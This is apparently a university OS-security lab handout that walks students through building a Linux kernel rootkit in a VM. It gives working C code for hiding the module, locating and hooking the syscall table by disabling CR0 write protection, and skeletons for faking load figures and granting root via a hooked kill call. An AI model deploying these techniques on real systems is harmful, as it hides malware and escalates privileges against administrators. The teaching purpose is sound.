# Lab 7: kernel rootkit

This lab continue our introduction to linux kernel programming and OS security following lab 3.
In this lab you will build a rootkit (please, watch the [corresponding video](https://web.microsoftstream.com/video/e753a384-ae8c-4261-9579-911fbbc9b184) from week 6).

## Recommended Video

[Week 6 - Video 1](https://web.microsoftstream.com/video/e753a384-ae8c-4261-9579-911fbbc9b184)

## Warning

Kernel development should not be done on your working OS!
You may lose data (e.g. crash may corrupt the file system) or you may have difficulty to boot the machine.
A few suggestions:
- Use the [provided VM](../vagrants/lab7/Vagrantfile)!
- Push your code to github/another machine.
- Save your VM state (right click on the VM in the virtualbox UI).

## Rootkit

A kernel rootkit is a piece of software designed to hide the presence of a malware from users and administrators.
The rootkit is designed to hide another piece of malware such as for example an ssh backdoor.
This is what you are going to do in this lab.

For example, in a scenario where an attacker has compromised a webserver he may install a backdoor to enter the system more easily in the future rather than exploiting the vulnerability again.
This can be achieved for example by installing an ssh service on the machine (i.e. a backdoor).
However, if an administrators do something as simple as `ps` it may see an unusual ssh daemon service running and remove it.

A kernel rootkit is a module running in the kernel. Kernel module have unlimited access to the kernel address space and have unrestricted access to the entire kernel memory.
The rootkit modify data structures and/or kernel behaviour in order to hide the presence of malicious code.
For example, our rootkit may hide the process from the `ps` command, hide the binaries in the file system, the open socket from netstat etc.

The goal of this lab is to build such a rootkit!

## Step 0: Setup your vagrant machine

I strongly (as in you will run in a lot of issue otherwise) to setup a virtual
environment through the following [vagrant script](../vagrants/lab7/Vagrantfile).

You can tweak the configuration in the `Vagrantfile`to run optimally on your hardware:
```ruby
config.vm.provider "virtualbox" do |vb|
  # Display the VirtualBox GUI when booting the machine
  vb.gui = true
  # Customize the amount of memory on the VM:
  vb.memory = "8192"
  # Customize CPU cap
  vb.customize ["modifyvm", :id, "--cpuexecutioncap", "70"]
  # Customize number of CPU
  vb.cpus = 6
  # Customize VM name
  vb.name = "lab7"
end
```

## Step 1: Building a kernel module

The first thing we are going to do is build a simple hello world kernel module.
Kernel modules are used to add functionality to the kernel and can be dynamically loaded.
You should all be familiar with drivers and you may have for example installed the [nouveau](https://nouveau.freedesktop.org/) drivers for nvidia card if you play video games on your Linux machine.

If you setup your VM correctly, you should have a `guest` folder on your host machine in the same directory as
you `Vagrantfile`. This folder maps to the `/vagrant` file on your guest machine.

Create a file `rootkit.c` in this folder. And put in the following content:
```C
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Thomas");
MODULE_DESCRIPTION("Hello Module");
MODULE_VERSION("0.0.1");

static int __init lkm_example_init(void) {
 printk(KERN_INFO "Hello, World!\n");
 return 0;
}

static void __exit lkm_example_exit(void) {
 printk(KERN_INFO "Goodbye, World!\n");
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
```

If you remember [Lab 3](LAB3.md) this should looks familiar.
The first few lines contains headers.
Then a number of metadata associated with your module.
An `init` and `exit` function, and finally we register those two functions.

Now we need to build our kernel module, to do so you need to create a `Makefile`,
with the following content:
```
obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
```

We then need to install the kernel headers as follow:
```
sudo apt-get install linux-headers-`uname -r`
```

Then simply run `make all`. A bunch of files should get generated.

To load your module:
```
sudo insmod rootkit.ko
```

To check that your module has loaded:
```
dmesg
lsmod | grep rootkit
```

To remove your module:
```
sudo rmmod rootkit.ko
```

To check that your module has been unloaded:
```
dmesg
lsmod | grep rootkit
```

We can hide our module, so an unsuspecting user won't know that we are there:
```C
#include <linux/list.h>

struct list_head *module_list;

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}
```

**Question:** Where should you use those functions?
To verify it works, load your module and run the following commands:

```
dmesg
lsmod | grep rootkit
```

You should see the output of your module, but it should not be on the list!
If you don't use `unhide` the module cannot be uninstalled!

## Step 2: Wrapping system calls

The next step in building our rootkit is to wrap our system call table as to
modify the behaviour of system calls.

The first thing to do is to write a function that will find the [system call table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md). The
code to do this is reasonably simple:

```C
#include <linux/syscalls.h>

#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#define SYS_CALL_NUM 300

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < (void*)END_ADDRESS) {
        sctable = (void **) i;
        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
        size_t j;
        // sanity check: no function pointer in the system call table should be NULL
        for (j = 0; j < SYS_CALL_NUM; j ++) {
            if (sctable[j] == NULL) {
                goto skip;
            }
        }
        return sctable;
        }
        skip:
        i += sizeof(void *);
    }

    return NULL;
}
```

**Question:** Explain this code.

Now let's modify your init function and see if this work!
```C
void **sys_call_table;

static int __init lkm_example_init(void) {
    printk(KERN_INFO "Hello, World!\n");

    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);
    return 0;
}
```

If you load your module, and use `dmesg`, you should see something like this:
```
[ 5812.810179] Hello, World!
[ 5812.811105] Found sys_call_table at ffffffff81801320
```

Now we are going to modify the behaviour of the `read` system call. We have a
bit of work to do.

First, the system call table is normally write protected. We need
to be able to turn that off:
```C
#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);
```

Now we can write our "hacked" function:
```C
unsigned long read_count = 0;

asmlinkage long (*original_read)(unsigned int, char __user *, size_t);

asmlinkage long hacked_read(unsigned int fd, char __user *buf, size_t count)
{
    read_count ++;

    pr_info("%d reads so far!\n", read_count);
    return original_read(fd, buf, count);
}

static int __init lkm_example_init(void) {
    printk(KERN_INFO "Hello, World!\n");

    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);

    void **modified_at_address = &sys_call_table[__NR_read];
    void *modified_function = hacked_read;

    DISABLE_W_PROTECTED_MEMORY
    original_read = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 0;
}
```

This is as simple as that!

**Question:** Explain this code.

Once you have built and loaded your module, you should now see something like this:
```C
[ 7863.500563] 529637 reads so far!
[ 7863.500566] 529638 reads so far!
[ 7863.500569] 529639 reads so far!
[ 7863.500572] 529640 reads so far!
[ 7863.540219] 529641 reads so far!
[ 7863.540381] 529642 reads so far!
[ 7863.540553] 529643 reads so far!
[ 7863.540966] 529644 reads so far!
```

If you try to remove your module, your kernel will promptly crash! (if it happened to you
simply reboot the machine)
This is happening because we forgot to restore our system call table to its
original state!

**Question**: modify your exit function to restore the system call table.

**Hint:** you need to use code similar to this, but putting back `original_read`.
```C
void **modified_at_address = &sys_call_table[__NR_read];
void *modified_function = hacked_read;

DISABLE_W_PROTECTED_MEMORY
original_read = xchg(modified_at_address, modified_function);
ENABLE_W_PROTECTED_MEMORY
```

**Question:** Similarly implement a "hacked" `write` system call.

## Step 3: Hiding resource usage

The malware our rootkit want to hide may be using a lot of CPU resources (e.g.
doing some crypto mining or launching remote attacks). We want to prevent the
user from noticing this.

In Linux, you retrieve such information via the [`sysinfo` system call](https://man7.org/linux/man-pages/man2/sysinfo.2.html).

**Question:** As you did previously for read and write, "hack" the sysinfo system call and
modify in the structure returned by the original system call the values in "load"
by random value so that the load appear to be between 0% and 20% (you may need
to put some thought into it as fully random value are not a great idea).
You may want to use the [`get_random_bytes`](https://elixir.bootlin.com/linux/v3.2/source/include/linux/random.h#L57) function.

## Step 4: Root whenever!

You can hack the `kill` system call that pass signal to processes to grant root
privilege to any process.

Your hacked `kill` system call may look something like this:
```C
asmlinkage int
hacked_kill(pid_t pid, int sig)
{
	struct task_struct *task;

	switch (sig) {
		case SIGSUPER:
			give_root();
			break;
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}
```

**Question:** implement the `give_root` function. See the skeleton bellow and check
the [`cred` data structure](https://elixir.bootlin.com/linux/v3.2/source/include/linux/cred.h#L116):
```C
void give_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
    	return;
    // TODO set the newcreds structure to give root privilege
    commit_creds(newcreds);
}
```

## Step 5: going further

We have just started our journey in building a complete rootkit. There is a lot
of extra functionality that you can explore. A few of them are listed bellow (in order of difficulty):

* hide memory consumption;
* ensure that your module cannot ever be unloaded (see [this](https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-module-use-counters.html))
* hide directories/files starting with a given prefix ("hack" [`getdents64`](https://linux.die.net/man/2/getdents64) and [`getdents`](https://linux.die.net/man/2/getdents));
* hide processes (you should look at the [`task` data structure]()https://elixir.bootlin.com/linux/v3.2/source/include/linux/sched.h#L1224) flags and also explore how to remove entries from [`/proc`](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html)).
* implement a simple way for you malware to interact with your rootkit from userspace;
* ensure your module is always loaded at boot time (and make sure a user cannot change that);
* hide open ports;
* try to build a rootkit for a more recent version of the kernel. Is it harder? Why?
* etc...

There is a lot you can potentially do, if you have the time/will feel free to go crazy on this.
